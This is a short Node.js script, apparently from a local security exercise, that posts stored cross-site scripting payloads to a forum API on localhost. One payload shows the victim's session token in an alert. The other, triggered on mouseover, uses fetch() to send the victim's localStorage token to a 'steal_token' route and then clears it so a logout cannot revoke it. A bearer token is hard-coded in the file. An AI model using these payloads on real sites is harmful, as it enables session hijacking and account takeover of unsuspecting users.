//SCRIPT to attack other user with xss
//Save dirty post that contain code to steal important data like token session
//To run, in folder "test", type -> node xss.js

var axios = require('axios')

//insert here valid token
var token = 'b0df031c6e0e574e25140763d94c2d4e66d8afac98ec6ad5b03641de1f7528b46a27a5f6e9a3267ca66eb432baff9d11da6de1f0b1d7da1d0d4f0cdf09fbd0da'


//I put a danger content with script inside
//With this script, every user that load this content, if has mouse over description, an alert
//with his token session is shown 


axios({
    method: 'post',
    url:  'http://127.0.0.1:3001/api/post',
    headers: { Authorization: `Bearer ${token}` },
    data: {
        "title": "danger post",
        "topic": "Work",
        "description": `<a onmouseover=alert(localStorage.token);>Danger Content</a>`
    }
})
.then((response) => {
    if(response.status==200)
        console.log("Danger Post is Added --> alert message")
})
.catch((error) => {
    console.log(error.message)
})

//On mouse over the danger item, i send an hide get request with token session as parameter
//In back-end i add a new routes at url "steal_token" that accepts an http get with token stolen as url param
//When attack runs (victim's mouse is over danger content), in the terminal of back-end, the token session of victim will be shown
//I also delete token from the victim browser's to avoid that it will be deleted by the victim on logout procedure
axios({
    method: 'post',
    url:  'http://127.0.0.1:3001/api/post',
    headers: { Authorization: `Bearer ${token}` },
    data: {
        "title": "danger post",
        "topic": "Work",
        "description": '<a onmouseover="fetch(`http://localhost:3001/steal_token/` + localStorage.token ); localStorage.token=``;">Danger Content</a>'
    }
})
.then((response) => {
    if(response.status==200)
        console.log("Danger Post is Added --> steal token and show it in external server")
})
.catch((error) => {
    console.log(error.message)
})
